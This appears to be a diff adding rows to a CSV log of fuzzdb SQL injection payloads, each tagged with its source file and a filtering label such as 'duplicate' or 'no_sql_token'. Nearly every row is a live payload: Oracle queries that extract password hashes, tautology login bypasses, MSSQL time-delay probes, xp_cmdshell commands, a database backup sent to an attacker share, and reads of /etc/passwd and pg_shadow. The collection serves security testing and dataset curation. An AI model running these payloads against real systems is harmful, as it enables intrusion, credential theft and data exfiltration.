+fuzzdb,attack/sql-injection/detect/oracle.txt,6,' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i,duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,7,' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i,duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,8,' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i,duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,9,' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i,duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,10,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i,duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,11,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i,duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,12,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i,duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,13,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i,duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,14,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i,duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,15,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,16,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,17,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,18,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,19,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,20,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,21,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,22,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,23,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,24,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,25,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,26,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,27,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,28,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,29,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,30,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=4)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,31,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,32,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,33,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=4)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,34,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=4)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,35,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=5)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,36,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=5)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,37,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,38,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,39,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=5)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,40,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=6)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,41,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,42,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=6)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,43,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,44,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,45,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,46,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,47,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,48,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,49,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,50,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,51,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,52,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,53,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,54,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i",duplicate
+fuzzdb,attack/sql-injection/detect/oracle.txt,55,,empty
+fuzzdb,attack/sql-injection/detect/xplatform.txt,2,|,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,3,!,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,4,?,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,5,/,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,6,//,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,7,//*,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,8,',no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,9,' -- ,duplicate
+fuzzdb,attack/sql-injection/detect/xplatform.txt,10,(,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,11,),no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,12,*|,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,13,*/*,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,14,&,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,15,0,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,16,031003000270000,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,19,0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,22,1 or 1=1,duplicate
+fuzzdb,attack/sql-injection/detect/xplatform.txt,25,'%20or%20''=',duplicate
+fuzzdb,attack/sql-injection/detect/xplatform.txt,26,'%20or%201=1,duplicate
+fuzzdb,attack/sql-injection/detect/xplatform.txt,27,')%20or%20('x'='x,duplicate
+fuzzdb,attack/sql-injection/detect/xplatform.txt,28,'%20or%20'x'='x,duplicate
+fuzzdb,attack/sql-injection/detect/xplatform.txt,32,%21,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,34,%26,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,35,%27%20or%201=1,duplicate
+fuzzdb,attack/sql-injection/detect/xplatform.txt,36,%28,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,37,%29,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,38,%2A%28%7C%28mail%3D%2A%29%29,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,39,%2A%28%7C%28objectclass%3D%2A%29%29,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,40,%2A%7C,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,41,||6,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,43,(||6),no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,44,%7C,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,45,a',no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,56,as,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,57,asc,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,60,bfilename,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,69,delete,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,70,desc,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,71,distinct,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,81,' group by userid having 1=1--,duplicate
+fuzzdb,attack/sql-injection/detect/xplatform.txt,82,handler,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,83,having,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,92,insert,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,93,like,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,94,limit,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,95,*(|(mail=*)),no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,96,*(|(objectclass=*)),no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,97,or,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,98,' or ''=',duplicate
+fuzzdb,attack/sql-injection/detect/xplatform.txt,100,' or 0=0 --,duplicate
+fuzzdb,attack/sql-injection/detect/xplatform.txt,101,' or 0=0 #,duplicate
+fuzzdb,attack/sql-injection/detect/xplatform.txt,102,""" or 0=0 --",duplicate
+fuzzdb,attack/sql-injection/detect/xplatform.txt,103,or 0=0 --,duplicate
+fuzzdb,attack/sql-injection/detect/xplatform.txt,104,or 0=0 #,duplicate
+fuzzdb,attack/sql-injection/detect/xplatform.txt,108,' or '1'='1,duplicate
+fuzzdb,attack/sql-injection/detect/xplatform.txt,109,' or '1'='1'--,duplicate
+fuzzdb,attack/sql-injection/detect/xplatform.txt,110,' or 1=1,duplicate
+fuzzdb,attack/sql-injection/detect/xplatform.txt,112,' or 1=1--,duplicate
+fuzzdb,attack/sql-injection/detect/xplatform.txt,113,' or 1=1-- ,duplicate
+fuzzdb,attack/sql-injection/detect/xplatform.txt,116,""" or 1=1--",duplicate
+fuzzdb,attack/sql-injection/detect/xplatform.txt,117,or 1=1,duplicate
+fuzzdb,attack/sql-injection/detect/xplatform.txt,118,or 1=1--,duplicate
+fuzzdb,attack/sql-injection/detect/xplatform.txt,122,or%201=1,duplicate
+fuzzdb,attack/sql-injection/detect/xplatform.txt,131,' or 'a'='a,duplicate
+fuzzdb,attack/sql-injection/detect/xplatform.txt,132,' or a=a--,duplicate
+fuzzdb,attack/sql-injection/detect/xplatform.txt,133,') or ('a'='a,duplicate
+fuzzdb,attack/sql-injection/detect/xplatform.txt,134,""" or ""a""=""a",duplicate
+fuzzdb,attack/sql-injection/detect/xplatform.txt,144,' or uid like '%,duplicate
+fuzzdb,attack/sql-injection/detect/xplatform.txt,145,' or uname like '%,duplicate
+fuzzdb,attack/sql-injection/detect/xplatform.txt,147,' or userid like '%,duplicate
+fuzzdb,attack/sql-injection/detect/xplatform.txt,148,' or user like '%,duplicate
+fuzzdb,attack/sql-injection/detect/xplatform.txt,149,' or username like '%,duplicate
+fuzzdb,attack/sql-injection/detect/xplatform.txt,153,password:*/=1--,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,154,PRINT,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,156,procedure,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,157,replace,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,158,select,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,163,'sqlattempt1,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,164,(sqlattempt2),no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,165,'sqlvuln,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,166,'+sqlvuln,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,167,(sqlvuln),no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,168,sqlvuln;,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,170,to_timestamp_tz,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,171,truncate,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,172,tz_offset,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,181,update,no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,183,",@variable",no_sql_token
+fuzzdb,attack/sql-injection/detect/xplatform.txt,184,@variable,no_sql_token
+fuzzdb,attack/sql-injection/exploit/ms-sql-enumeration.txt,1,select @@version,duplicate
+fuzzdb,attack/sql-injection/exploit/ms-sql-enumeration.txt,2,select @@servernamee,duplicate
+fuzzdb,attack/sql-injection/exploit/ms-sql-enumeration.txt,3,select @@microsoftversione,duplicate
+fuzzdb,attack/sql-injection/exploit/ms-sql-enumeration.txt,4,select * from master..sysserverse,duplicate
+fuzzdb,attack/sql-injection/exploit/ms-sql-enumeration.txt,5,select * from sysusers,duplicate
+fuzzdb,attack/sql-injection/exploit/ms-sql-enumeration.txt,6,exec master..xp_cmdshell 'ipconfig+/all'	,duplicate
+fuzzdb,attack/sql-injection/exploit/ms-sql-enumeration.txt,7,exec master..xp_cmdshell 'net+view',duplicate
+fuzzdb,attack/sql-injection/exploit/ms-sql-enumeration.txt,8,exec master..xp_cmdshell 'net+users',duplicate
+fuzzdb,attack/sql-injection/exploit/ms-sql-enumeration.txt,9,exec master..xp_cmdshell 'ping+<attackerip>',duplicate
+fuzzdb,attack/sql-injection/exploit/ms-sql-enumeration.txt,10,BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat',duplicate
+fuzzdb,attack/sql-injection/exploit/ms-sql-enumeration.txt,11,"create table myfile (line varchar(8000))"" bulk insert foo from 'c:\inetpub\wwwroot\auth.aspâ'"" select * from myfile""--",duplicate
+fuzzdb,attack/sql-injection/exploit/mysql-read-local-files.txt,1,create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;,duplicate
+fuzzdb,attack/sql-injection/exploit/postgres-enumeration.txt,1,select version();	,duplicate
+fuzzdb,attack/sql-injection/exploit/postgres-enumeration.txt,2,select current_database();,duplicate
+fuzzdb,attack/sql-injection/exploit/postgres-enumeration.txt,3,select current_user;,duplicate
+fuzzdb,attack/sql-injection/exploit/postgres-enumeration.txt,4,select session_user;,duplicate
+fuzzdb,attack/sql-injection/exploit/postgres-enumeration.txt,5,select current_setting('log_connections');,duplicate
+fuzzdb,attack/sql-injection/exploit/postgres-enumeration.txt,6,select current_setting('log_statement');,duplicate
+fuzzdb,attack/sql-injection/exploit/postgres-enumeration.txt,7,select current_setting('port');,duplicate
+fuzzdb,attack/sql-injection/exploit/postgres-enumeration.txt,8,select current_setting('password_encryption');,duplicate
+fuzzdb,attack/sql-injection/exploit/postgres-enumeration.txt,9,select current_setting('krb_server_keyfile');,duplicate
+fuzzdb,attack/sql-injection/exploit/postgres-enumeration.txt,10,select current_setting('virtual_host');,duplicate
+fuzzdb,attack/sql-injection/exploit/postgres-enumeration.txt,11,select current_setting('port');,duplicate
+fuzzdb,attack/sql-injection/exploit/postgres-enumeration.txt,12,select current_setting('config_file');,duplicate
+fuzzdb,attack/sql-injection/exploit/postgres-enumeration.txt,13,select current_setting('hba_file');,duplicate
+fuzzdb,attack/sql-injection/exploit/postgres-enumeration.txt,14,select current_setting('data_directory');,duplicate
+fuzzdb,attack/sql-injection/exploit/postgres-enumeration.txt,15,select * from pg_shadow;,duplicate
+fuzzdb,attack/sql-injection/exploit/postgres-enumeration.txt,16,select * from pg_group;,duplicate
+fuzzdb,attack/sql-injection/exploit/postgres-enumeration.txt,17,create table myfile (input TEXT);,duplicate
+fuzzdb,attack/sql-injection/exploit/postgres-enumeration.txt,18,copy myfile from '/etc/passwd'; ,duplicate
+fuzzdb,attack/sql-injection/exploit/postgres-enumeration.txt,19,select * from myfile;copy myfile to /tmp/test;,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,1,)%20waitfor%20delay%20'0:0:20'%20/*,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,2,)%20waitfor%20delay%20'0:0:20'%20--,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,3,')%20waitfor%20delay%20'0:0:20'%20/*,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,4,')%20waitfor%20delay%20'0:0:20'%20--,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,5,""")%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,6,""")%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,7,))%20waitfor%20delay%20'0:0:20'%20/*,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,8,))%20waitfor%20delay%20'0:0:20'%20--,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,9,'))%20waitfor%20delay%20'0:0:20'%20/*,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,10,'))%20waitfor%20delay%20'0:0:20'%20--,duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,11,"""))%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,12,"""))%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,13,",NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,14,",NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,15,"',NULL)%20waifor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,16,"',NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,17,""",NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,18,""",NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,19,"),NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,20,"),NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,21,"'),NULL)%20waifor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,22,"'),NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,23,"""),NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,24,"""),NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,25,",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,26,",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,27,"',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,28,"',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,29,""",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,30,""",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,31,"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",duplicate
+fuzzdb,attack/sql-injection/payloads-sql-blind/payloads-sql-blind-MSSQL-INSERT.txt,32,"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",duplicate
